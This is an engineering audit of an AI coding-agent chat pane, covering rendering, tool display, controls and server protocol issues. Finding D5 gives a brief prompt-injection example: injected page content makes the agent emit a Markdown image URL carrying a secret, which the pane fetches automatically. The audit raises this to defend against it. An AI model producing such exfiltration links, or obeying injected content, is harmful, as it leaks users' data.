# Agent pane audit — 2026-11-13

This pass looks for what stands between the agent pane and the best AI conversation
interface it can be. It covers the composer, transcript, response rendering, tool and
work display, interaction panels, and the server and protocol data that feed them.
Nothing was changed; this is a list of findings, not of fixes.

Items the 2026-11-09 and 2026-11-12 audits resolved (queue, questions, drafts, prompt
outline, history search, diff comments) are not repeated.

## Status after implementation

The findings below were implemented on 2026-11-13 and 2026-11-14, together with
running-agent visibility (elapsed time, outcome, an agent's own steps, notices when
agents are stopped, and a notice when the server is older than the app). The text
below is the audit as written and describes the pane before those changes.

`scripts/validate.sh` passed on the result: 2,223 tests, 33 skipped, no failures.
Nothing was checked in the running app.

Not done, or done differently:

| Finding | Outcome |
| --- | --- |
| A2 paging | The server archives what it trims from now on and pages it back. Items trimmed before this build are only counted. |
| A13 | Mermaid and math blocks still change height when their fence closes. |
| B2 | Codex retries and Claude rate limits show. Claude retry events do not; their shape is unconfirmed. |
| B11 | Model fallback is not shown; its event shape is unconfirmed. |
| C2 | Fork from a message works for Claude only. |
| C5 | "Always allow" is per tool and per conversation, Claude only. Deny with a reason is in the context menu. |
| D3 | Long code blocks fold to 24 lines; the header is not pinned. |
| D4 | Text size changes through the font-size shortcuts only and lasts for the app session. Headings four to six are unchanged; a baseline test pins them. |
| D7 | Nested ordered lists keep a. and i. numbering, and a fraction keeps the fixed line height; tests pin both. |
| F2 | A send still waits for its checkpoint, which revert needs. Capture is faster. Codex output updates are not coalesced. |

New behavior worth knowing: closed conversations untouched for 30 days are deleted
when the server starts, with their checkpoints, outputs and attachments.

## What to do first

1. **Send Claude's slash commands to the app** (A1). One missing coding key hides
   every Claude command from the `/` menu.
2. **Make tool state visible** (A3, B1, B3). A running command, a finished one and an
   interrupted one look the same, and the working indicator is only a timer.
3. **Stop losing the start of long conversations** (A2). The transcript keeps 512
   items or 512 KiB, counts tool results twice, and drops the rest without a marker.
4. **Stop with the keyboard** (C1). Escape does nothing while the agent works.
5. **Fix link detection and decide a remote-fetch policy** (A4, A7, D5). `main.rs` in
   prose becomes a web link, and images the assistant names load without asking.
6. **Use the full width in narrow panes** (D1, A11). The answer column is 80% of the
   lane at every width, which costs the most in the splits Tab is built around.
7. **Add retry, edit-and-resend and revert** (C2, C3, C4). The checkpoints and fork
   plumbing these need already exist on the server.
8. **Send changes, not snapshots** (F1). Every streamed update re-reads the whole
   conversation; an incremental read is the base for smoother streaming.

## Method and limits

- **Read:** the review covered `Sources/TabApp/Agents`, `Sources/TabServer/Agents`
  and the agent protocol types. I read the pane shell, composer, transcript and
  panels; three reviewers read response rendering, tool display, and server and
  protocol. I re-read the code behind each of their P1 claims and several P2 claims.
- **Rendered:** a temporary test drew the pane off screen in six states (empty,
  completed turn, expanded work, working, failed, approval), dark and light, at
  1100 and 520 points. The images are in `build/validation/agent-pane-2026-11-13/`.
  The test file was removed afterwards.
- **Tested:** two claims were run, A1 and A6.
- **Not done:** the live app was not inspected, because the screen was locked.
  Nothing was measured with Instruments, VoiceOver was not run, and no provider
  session was recorded. The fixtures use hand-written items, so they show layout
  and state, not exactly what each provider sends.

Each finding says how it is known:

| Label | Meaning |
| --- | --- |
| Tested | I ran code that shows it |
| Rendered | Visible in the fixture images |
| Read | I read the code path |
| Reviewer | A reviewer read the code path; I did not re-trace it |
| Suspected | Inferred; needs a live check |

P1 is wrong, misleading or lost content today. P2 is significant friction or a
missing capability people expect. P3 is polish.

## A. Wrong or misleading today

**A1 · P1 · Claude's slash commands never reach the composer** (Tested)
- `AgentChatSnapshot.commands` is declared (`Sources/TabProtocol/AgentChat.swift:118`)
  but missing from `CodingKeys` and `init(from:)` (156-179). The server fills it from
  Claude's init message (`AgentSessions.swift:800`).
- A snapshot with `commands = ["compact", "review"]` decodes with `commands == nil`.
- The `/` menu therefore lists no Claude command, and the "run provider commands
  after the current response" guard (`AgentPaneController.swift:578`) never fires.
- Change: add the key, decode it with `decodeIfPresent`, add a round-trip test.

**A2 · P1 · Long conversations silently lose their beginning** (Read)
- The server keeps the newest 512 items within 512 KiB and removes the rest
  (`AgentSessions.swift:1251-1274`). Only the trimmed snapshot is saved.
- A tool result is stored as both `detail` and `tool.output`
  (`ClaudeAgentRuntime.swift:110-113`) and counted twice, so about 16 large file
  reads can fill the budget.
- The app passes `omittedCount: 0` (`AgentPaneView.swift:515`), so the existing
  "Earlier messages are saved" label and `onEarlier` never appear.
- Change: store tool bodies once; add an omitted count to the snapshot and show the
  marker; then page earlier items from the provider transcript that
  `AgentHistory` already parses.

**A3 · P1 · Running, interrupted and finished tools look the same** (Rendered, Read)
- The row header draws an icon, a name and a chip; status goes only to the tooltip
  (`AgentToolHeader.swift:67-111`). In the working render, a finished Read and a
  running Bash are indistinguishable.
- Stopping a turn sets `isComplete` on every item without changing `tool.status`
  (`AgentSessions.swift:941`), so the tool stays `running` forever and expands to
  "No output." (`AgentCommandPresentation.swift:41`).
- Change: draw the activity glyph in the icon slot while running, add an
  "Interrupted" suffix, and treat a complete item with a running status as interrupted.

**A4 · P1 · Bare file names in prose become web links** (Read; probe by Reviewer)
- `NSDataDetector` runs over rendered prose and links every match
  (`AgentMarkdown.swift:312-319`). It returns `http://main.rs`, `http://lib.rs` and
  `http://script.pl` for those plain words.
- "I updated main.rs and lib.rs" shows two link chips that open a browser, and each
  host is sent to the favicon service (D5).
- Change: accept a detected link only with an explicit scheme or `www.`; treat
  `name.ext` with a source extension as a file.

**A5 · P2 · Composer messages vanish while the agent works, and stick when it is idle** (Read)
- Every accepted snapshot clears `errorMessage` (`AgentPaneController.swift:957`).
  During streaming that is about every 100 ms, so "Stop the current response before
  changing plan mode." flashes and disappears.
- When idle the same message stays until the next snapshot, with no dismiss control
  and a "Refresh" button that does not relate to it (1018).
- `/status` shows its answer in this error slot (773-775).
- Change: give messages their own lifetime (dismiss button, timeout for
  informational ones), and show Refresh only for connection errors.

**A6 · P2 · Subagent and queue labels truncate with room to spare** (Tested, Rendered)
- Rows size labels to `intrinsicContentSize` (`AgentSubagentsView.swift:207,215`),
  which is about 3.5 points narrower than the cell needs (182.0 against 185.6).
- At 1100 points the row reads "Check provider replay fixtur…" and "7 tools · 18k
  toke…" beside 300 points of empty space.
- `AgentInteractionPanels.swift:277` sizes "Needs review" the same way; I did not
  render that one.
- Change: size from the cell (`cellSize`) or add the cell's padding.

**A7 · P2 · Inline code with a slash is styled as a file link** (Read)
- `inferredFile` accepts any text containing `/` (`AgentResponseLinks.swift:24`).
  `origin/main`, `application/json` and `@types/node` render as links and turn into
  struck-through "missing" files after a hover.
- Change: for slash-only candidates require a known extension or a leading `./`,
  `../`, `/` or `~/`.

**A8 · P2 · Messages trimmed mid-turn come back after the final answer** (Read, not reproduced)
- At the end of a Claude turn every assistant message of that turn is sent again
  (`ClaudeAgentRuntime.swift:178`), and an unknown ID is appended
  (`AgentSessions.swift:745-747`). A message already trimmed by A2 reappears at the
  end, out of order.
- Change: re-send only changed text, or add an update that never appends.

**A9 · P2 · Finishing a turn folds the rows being read and moves the viewport** (Read, not reproduced)
- A completed turn's work collapses to one line unless that group was already
  expanded (`AgentTranscriptDocument.swift:176`). The scroll anchor's row no longer
  exists, so it falls back to an absolute offset in a much shorter document (377-380).
- Change: keep the group expanded when one of its rows is expanded, focused or
  holds the anchor.

**A10 · P2 · The fold summary miscounts and hides what matters** (Read, Rendered)
- "5 tool calls, 1 message" counts every tool item, including thinking blocks and
  todo updates (`AgentCompletedWorkRow.swift:34-41`). It says "Failed" only for a
  failed turn (50), so a failed command inside it leaves no trace in the summary.
- A proposed plan folds away too; a plan-only turn reads "1 tool call" (Reviewer).
- Change: count by kind ("3 commands · 2 edits"), add "· 1 failed" with a click that
  reveals it, and keep the newest plan visible.

**A11 · P2 · Wrapped code strands its indentation** (Rendered)
- At 520 points the line `    entry.inbox.releaseReservation(markingUncertain: true)`
  renders as an empty line, then the call at column zero, split as
  `markingUncer` / `tain`.
- Change: wrap with a hanging indent equal to the line's leading whitespace, and
  break at punctuation before breaking inside an identifier.

**A12 · P2 · Large edits lose the start of their diff without notice** (Reviewer)
- Each diff is cut to its last 8 KiB (`AgentSessions.swift:1370,1404`), and the
  parser drops lines before the first surviving hunk header (`AgentToolDiff.swift:24-25`)
  without setting the truncated flag.
- Change: cut from the end at a line boundary and set `truncated`.

**A13 · P2 · Half-written Markdown flickers while streaming** (Reviewer)
- A snapshot ending in `Here are the steps:\n-` renders the sentence as a heading
  until the next character (`AgentResponseParser.swift:152-156`). A table shows raw
  pipes until its separator row completes. Mermaid and math fences change height
  when they close.
- Change: hold back a structurally ambiguous last line while streaming.

**A14 · P3 · Smaller defects**
- A repaired streaming tail can stay italic inside quotes and `<details>` after the
  message completes (`AgentResponseView.swift:209-237`) (Reviewer).
- A shell failure whose output contains "permission denied" is labelled Denied
  (`ClaudeAgentRuntime.swift:496-499`) (Reviewer).
- A link without a loaded favicon leaves an empty gap before its text (Rendered).

## B. Seeing what the agent is doing

**B1 · P2 · The working indicator is only a timer** (Rendered, Read)
- The last row shows a glyph and `48.1s` (`AgentTranscriptViews.swift:503-547`). It
  does not say whether the agent is thinking, running `swift build` or waiting on a
  subagent. A 10 Hz timer drives the tenths.
- Change: add the newest incomplete item's label ("Bash · swift build",
  "Thinking"), show whole seconds, and tick once a second.

**B2 · P2 · Retries and rate limits are invisible** (Reviewer; Claude event shapes Suspected)
- Codex errors marked `willRetry` are ignored (`AgentRuntime.swift:711`), and
  Claude's retry events fall through (`ClaudeAgentRuntime.swift:205`). During an
  overload the pane shows plain work for minutes, then fails.
- Change: an optional activity field on the snapshot (retrying, attempt, resumes at).

**B3 · P2 · No per-tool duration, and failure is a faint tint** (Read)
- Start and end times are on the wire but the app shows neither. A failed tool is
  marked by its icon at 28% of the danger color (`AgentToolDetailView.swift:562-564`).
- Change: a muted duration in the header from one second up, and an "exit 1" or
  "Failed" suffix.

**B4 · P2 · Expanding an edit shows no diff** (Reviewer)
- The expanded row has a path and an "Open diff" button that opens one window per
  tool (`AgentFileChangePanel.swift:69-119`). Reviewing twelve edits takes twelve
  windows. Creating a file and modifying one are both titled "Edit".
- Change: embed the existing diff rows view in the row, capped in height, with
  "+12 −3" in the collapsed header.

**B5 · P2 · Todo updates stack** (Reviewer)
- Each Claude `TodoWrite` adds a full card and a raw `TodoWrite` row
  (`AgentPlanPresentation.swift:18`, `ClaudeAgentRuntime.swift:94-96`). An eight-step
  list updated nine times shows nine cards.
- Change: show the newest card per turn and one line for each superseded update.

**B6 · P2 · Tool output is a 16 KiB tail with no way to see the rest** (Reviewer)
- Output keeps its last 16 KiB (`AgentSessions.swift:1358-1360`); for a file read
  that is the end of the file. There is no copy button.
- Change: store full output as a blob the way tool images are, and add "Show full
  output", "Copy command" and "Copy output".

**B7 · P2 · Subagents are opaque** (Reviewer)
- A subagent's own steps are dropped (`ClaudeAgentRuntime.swift:60`), its Markdown
  report renders as raw monospaced text, the running row shows no elapsed time, and
  a failed background agent disappears (257-261).
- Change: render the report as a response, show elapsed time, keep failed agents
  until dismissed, and fetch a bounded child transcript on demand.

**B8 · P2 · Tool input does not stream** (Reviewer)
- Input fragments are held until the block ends (`ClaudeAgentRuntime.swift:314-327`).
  While Claude writes a large file the row is a bare tool name.
- Change: send the path or command as soon as it parses.

**B9 · P2 · Paths and commands in tool rows are inert** (Reviewer)
- The typed panels set plain text (`AgentToolPresentation.swift:57-72`). The diff
  window has no "open in editor".
- Change: a header menu (Open file, Copy path, Copy command, Run in terminal) and
  links for `path:line` in arguments and output.

**B10 · P2 · Find does not search tool rows** (Read)
- Only user, assistant and plan text is searchable
  (`AgentConversationFindModel.swift:63-71`). An error string or a command is not
  found even when it is on screen.
- Change: search each tool's name and summary first, then its command and output.

**B11 · P3 · Smaller gaps**
- The changed-files card starts with folders collapsed, so two changed files show
  as two folder names (Rendered). Expand it when it holds a dozen files or fewer.
- Tokens, cost, model and stop reason per turn are dropped on the server
  (`ClaudeAgentRuntime.swift:164-176`) (Reviewer). The context ring stays hidden
  below 50% (`AgentPaneView.swift:368`) and has no Compact action.
- Thinking rows use a wrench icon; a web fetch result is one collapsed paragraph;
  MCP tools lose their server name; no runtime produces the file-search panel, so
  Grep results are raw text (Reviewer).
- Background shells are not listed (`ClaudeAgentRuntime.swift:218-226`) (Reviewer).
- A failed MCP server, a model fallback and a hook that blocked are never shown,
  because only commands and model are read from Claude's init message (Reviewer).

## C. Controlling the conversation

**C1 · P2 · No keyboard way to stop** (Read)
- `ShortcutCatalog` has no stop action. Escape in the composer only closes the
  suggestion list; `doCommandBy` handles only Return
  (`AgentPaneController.swift:1239-1246`). The alternatives are the mouse or typing
  `/stop`.
- Change: a catalog action bound to Escape when the suggestion list is closed, and
  actions for Allow and Deny.

**C2 · P2 · No retry, edit-and-resend or fork from a message** (Read; provider support Suspected)
- A message has one action, Copy. The protocol's `fork` request is reachable only
  from the CLI, and forks at the latest message.
- Claude is already launched with resume-at flags and Codex with `thread/fork`
  (`AgentRuntime.swift:231-235,273`), so a fork point per turn is close.
- Change: record the provider message at each turn start; add "Retry", "Edit and
  resend" and "Fork from here" to the user message.

**C3 · P2 · No revert of a turn's changes** (Reviewer)
- Every turn has before and after trees pinned (`AgentCheckpointStore.swift:18-40`),
  but the only request reads them.
- Change: "Revert turn" and "Revert file" in the changed-files card, guarded by a
  check that the files still match the turn's after state.

**C4 · P2 · A failed turn offers nothing to press** (Rendered, Read)
- The banner reads "Turn failed · Change the model or try again" with no button
  (`AgentPaneController.swift:1034`). The cause is the provider's raw text, with no
  kind or retry hint on the wire (`AgentRuntime.swift:745-754`).
- "Not logged in" surfaces as the provider's own instruction, which cannot be
  followed in the pane (Suspected).
- Change: classify failures on the server (auth, rate limit, overload, crash,
  context) and offer the matching action: Retry, Log in, Compact.

**C5 · P2 · Approvals are easy to miss and offer two choices** (Rendered, Read)
- The request is a transcript row, so it can be off screen. The "Waiting for
  approval" capsule is a label, not a button. Choices are Allow and Deny; there is
  no "always allow this" and no deny with a reason.
- Change: show the pending approval in the panel stack like questions, or make the
  capsule jump to it; add the two missing choices.

**C6 · P2 · Model and effort are locked while the agent works** (Read)
- The picker is disabled during work (`AgentPaneController.swift:1101-1104`), so a
  queued prompt cannot be given a different model without the queue editor.
- Changing Claude's model restarts its process and clears running subagents without
  a notice (`AgentRuntime.swift:136-139`) (Reviewer).
- Change: let the picker set the next prompt's model at any time, and warn before a
  restart ends background agents.

**C7 · P3 · Smaller gaps**
- "Send this prompt again?" is an app-modal alert (`AgentPaneController.swift:1339`).
- A closed conversation tells you to open a new pane but offers no button (1032).
- There is no export or "copy conversation".

## D. Reading the answer

**D1 · P2 · The answer column is 80% of the lane at every width** (Rendered)
- `widthFraction` is 0.8 (`AgentTranscriptViews.swift:97`). At 520 points the answer
  gets about 380 points and a fifth of the pane stays empty while code wraps.
- Change: drop the gutter below about 700 points, or let code, tables and diagrams
  use the full lane.

**D2 · P2 · A drag selection stops at each block** (Reviewer)
- Each section is its own text view (`AgentMarkdown.swift:653-659`). Dragging from a
  paragraph through a code block selects only the paragraph.
- Change: extend the drag across views in the host; the multi-view selection model
  already exists.

**D3 · P2 · Long code blocks have no collapse and no pinned header** (Reviewer, Rendered)
- In a 400-line block, Copy is far above the visible part
  (`AgentResponseView.swift:833-843`). The language shows as an icon only.
- Change: collapse past about 40 lines, or pin the header of the block crossing the
  top edge; show the language name.

**D4 · P2 · No text size control** (Reviewer; shortcuts Read)
- Body text is 14-point light, hard-coded in 31 places. The font-size shortcuts go
  to the terminal only (`Actions.swift:68-69`). Headings four to six look like bold text.
- Change: one agent text scale in Appearance, driven by the existing shortcuts.

**D5 · P2 · Remote images and favicons load without asking** (Read)
- An image the assistant names is fetched as soon as it is on screen
  (`AgentResponseMedia.swift:106-120`), and every link host goes to Google's favicon
  service (`AgentLinkFavicon.swift:59-64`), including partial hosts mid-stream.
- A page that injects `![](https://host/?d=secret)` gets that request sent. With
  full access the agent could do the same through a command, so this matters most
  for conversations that ask before each tool.
- Change: a "Load remote images" setting (always, click to load, never), and no
  favicon lookups while streaming.

**D6 · P2 · Streaming arrives in bursts and re-renders whole prose runs** (Reviewer)
- Text lands about 8 to 10 times a second with no smoothing. Each update re-parses
  the message, and a run of paragraphs is one section that is rebuilt and laid out
  again in full (`AgentResponseView.swift:441-457,631`).
- Change: cache each block's rendered text and replace only the changed tail; see F1.

**D7 · P3 · Smaller gaps**
- The gap under a user message is about 54 points (28 reserved for its hover
  footer plus 26 of spacing), against 8 to 10 between other rows (Rendered).
- Unsupported Mermaid families (`erDiagram`, `mindmap`, `gitGraph`) show a red
  "Diagram error"; a neutral "shown as source" note fits better (Reviewer).
- Tall inline math overlaps neighbouring lines; `$FOO/$BAR` becomes math; nested
  ordered lists are renumbered to a. and i.; HTML tables show raw tags (Reviewer).
- With the sidebar swipe gesture on, horizontal scrolling of wide code and tables
  is swallowed (`WorkspaceView.swift:97-111`) (Reviewer).

## E. Composer

**E1 · P2 · No prompt recall** (Read)
- Up Arrow in an empty composer does nothing. Recalling the last prompt to edit it
  is the fastest correction path in every terminal agent.

**E2 · P3 · The `/` menu orders and describes poorly** (Read)
- Navigation actions come first, and every provider command reads "Provider
  command" (`AgentComposerCoordinator.swift:30-48,192`). Skills are pasted as a text
  attachment, so arguments and `allowed-tools` are not honoured (Reviewer).
- Change: rank by use, show real descriptions, and send `/name args` natively once
  A1 is fixed.

**E3 · P3 · Plan mode has no visible switch** (Read)
- The chip appears only while plan mode is on (`AgentPaneController.swift:993`).
  The ways in are Shift-Tab and the command palette; neither is visible in the
  composer, and there is no `/plan`.

**E4 · P3 · Dictation gives no feedback and looks like voice mode** (Read, Rendered)
- Recognized text appears only on stop (`AgentVoice.swift:89-90`), recording ends
  silently at 60 seconds, and the waveform button is the most prominent control in
  an idle composer.
- Change: insert partial text live, show the remaining time, use a microphone icon.

**E5 · P3 · Attaching is narrower than it could be** (Read)
- Files drop only on the composer card (`AgentPaneView.swift:395`). A project file
  is uploaded as bytes rather than referenced as `@path`. A long paste stays inline.

**E6 · P3 · Smaller gaps**
- Stop and Send are the same size and weight side by side (Rendered).
- The empty state names no folder, branch or recent conversation (Rendered).
- `@` with no query lists the first 30 paths, and loading thread suggestions reads
  up to 24 full conversations one after another
  (`AgentPaneController.swift:248-256`).

## F. Streaming, scale and server

**F1 · P2 · Every update re-reads the whole conversation** (Read)
- The server announces a change, the app waits 80 ms and requests the full snapshot
  (`AgentPaneController.swift:508-527`), up to 512 KiB, about ten times a second
  per streaming pane. The server rewrites the snapshot to disk every half second.
- The app then compares the whole item array (`AgentPaneView.swift:514`) and
  rebuilds the transcript's entries.
- Change: a `readSince(session, revision)` request returning changed items and
  header fields. Old clients keep `read`.

**F2 · P3 · Smaller costs** (Reviewer unless noted)
- Model discovery starts both CLIs about once a minute per pane
  (`AgentModelCatalogService.swift:44`).
- Codex command output is re-sent whole on every delta
  (`CodexAgentRuntime.swift:67-76`).
- Each send waits for a `git add --all` checkpoint (`AgentSessions.swift:517-532`).
- Attachment staging of up to 8 MiB runs on the shared sessions queue (410-411).
- Closed conversations are never pruned from disk.
- `try!` outside tests at `CodexAgentRuntime.swift:282`.
- Each keystroke runs `updateControls`, which scans all items (Read).
- Tables re-measure every cell on each width during a split drag
  (`AgentResponseTable.swift:67-102`).
- Importing provider history drops thinking, images, exit codes and durations.

## G. Keyboard and accessibility

**G1 · P3 · Composer controls show no keyboard focus** (Read)
- Send, Stop, attach, the model picker and the context ring set
  `focusRingType = .none` and draw nothing for focus
  (`AgentComposerControls.swift:240,288-309`).

**G2 · P3 · The transcript cannot be driven from the keyboard** (Read)
- Page Up and Page Down act on the composer's own scroll view. Outline, previous and
  next prompt have no default keys (`Shortcuts.swift:807-810`), and the terminal's
  previous-prompt and scroll-to-bottom shortcuts are not routed to agent panes
  (`Actions.swift:64-66`). Nothing moves between tool rows or to the next failure.

**G3 · P3 · Rendered blocks and forms** (Suspected; VoiceOver not run)
- Code blocks, tables and expanded tool output are unlabelled text areas; disclosure
  state is only in the label.
- The question form has no Command-Return to submit, and the custom answer is a
  single-line field (`AgentInteractionPanels.swift:497-500`) (Read).

## Needs a live check

| Claim | Where | What would settle it |
| --- | --- | --- |
| Codex child-thread events are applied to the parent, ending its turn early | `AgentRuntime.swift:701-710` | A recorded subagent run |
| Claude output after a background task finishes streams while status is idle, with Stop disabled | `AgentSessions.swift:356-364` | A background task that reports back |
| Codex `/review` and result-only Claude commands render nothing | `CodexAgentRuntime.swift:126`, `ClaudeAgentRuntime.swift:177` | One live `/review` |
| A failed interrupt leaves the turn working forever | `AgentSessions.swift:635-640` | A test with a closed stdin |
| Vertical scrolling is trapped over code blocks and expanded output | `AgentResponseView.swift:699-703` | One scroll over a tall block |

## Done well; keep

- **Virtualized transcript:** rows mount only near the viewport, state survives
  eviction, and the scroll anchor holds through updates.
- **Response rendering:** real code blocks with highlighting for about 70
  languages, tables with copy as Markdown or CSV, native Mermaid and LaTeX with a
  source toggle, footnotes, alerts and `<details>`.
- **Terminal output:** cursor, erase and carriage-return handling with full color.
- **Checkpoints:** per-turn trees under private refs that never touch the index,
  with unified and split diffs and line-anchored review comments.
- **Delivery:** the durable queue, acceptance ledger, draft store and reconnect
  fencing from the earlier audits.
- **Provider plumbing:** reasoning streamed with stable IDs, compaction with token
  counts, turn time that excludes waiting on the user, and a hardened process
  transport.
